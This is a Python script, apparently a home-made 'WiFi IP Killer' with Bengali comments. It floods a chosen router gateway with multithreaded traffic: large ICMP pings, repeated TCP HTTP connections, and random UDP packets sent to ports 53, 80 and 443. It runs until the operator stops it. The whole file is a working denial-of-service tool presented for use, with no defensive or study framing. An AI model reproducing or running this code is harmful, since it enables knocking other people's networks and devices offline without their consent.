#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WiFi IP Killer - একটানা চলবে, বন্ধ হবে না (অটো রিকানেক্ট + বর্ধিত থ্রেড)

import os
import sys
import time
import socket
import random
import threading
import subprocess

# ===== কনফিগ =====
GATEWAY = input("Enter router IP (default 192.168.1.1): ").strip() or "192.168.1.1"
THREADS = int(input("Threads (default 200): ") or 200)
PORT = 80

# ===== গ্লোবাল =====
running = True
sent = 0
lock = threading.Lock()

# ===== ICMP =====
def icmp_flood():
    global sent
    while running:
        try:
            subprocess.run(['ping', '-c', '1', '-s', '65500', GATEWAY],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=1)
            with lock:
                sent += 1
        except:
            pass

# ===== TCP =====
def tcp_flood():
    global sent
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.2)
            sock.connect((GATEWAY, PORT))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + GATEWAY.encode() + b"\r\n\r\n")
            sock.close()
            with lock:
                sent += 1
        except:
            pass

# ===== UDP =====
def udp_flood():
    global sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while running:
        try:
            for _ in range(5):
                data = os.urandom(1400)
                sock.sendto(data, (GATEWAY, 53))
                sock.sendto(data, (GATEWAY, 80))
                sock.sendto(data, (GATEWAY, 443))
                with lock:
                    sent += 3
        except:
            pass

# ===== স্ট্যাটাস =====
def status():
    while running:
        time.sleep(3)
        with lock:
            print(f"[+] Packets: {sent} | Threads: {THREADS*3}")

# ===== স্টপ লিসেনার =====
def stop_listener():
    global running
    while running:
        cmd = input()
        if cmd.strip().lower() == 'stop':
            running = False
            break
        elif cmd.strip().lower() == 'status':
            with lock:
                print(f"[+] Total packets sent: {sent}")

# ===== মেইন =====
if __name__ == "__main__":
    print(f"\n[!] ===== WiFi IP KILLER (PERMANENT) =====")
    print(f"[!] Target: {GATEWAY}")
    print(f"[!] Threads: {THREADS}")
    print(f"[!] Type 'stop' to stop | 'status' for count")
    print("[!] This will NOT stop until you type stop\n")

    # সব থ্রেড স্টার্ট
    for _ in range(THREADS // 3):
        threading.Thread(target=icmp_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=udp_flood, daemon=True).start()

    threading.Thread(target=status, daemon=True).start()
    threading.Thread(target=stop_listener, daemon=True).start()

    # মূল লুপ – যতক্ষণ চলবে
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False

    print("\n[+] Stopping...")
    time.sleep(2)
    print(f"[+] Total packets sent: {sent}")
    print("[+] Attack stopped.")
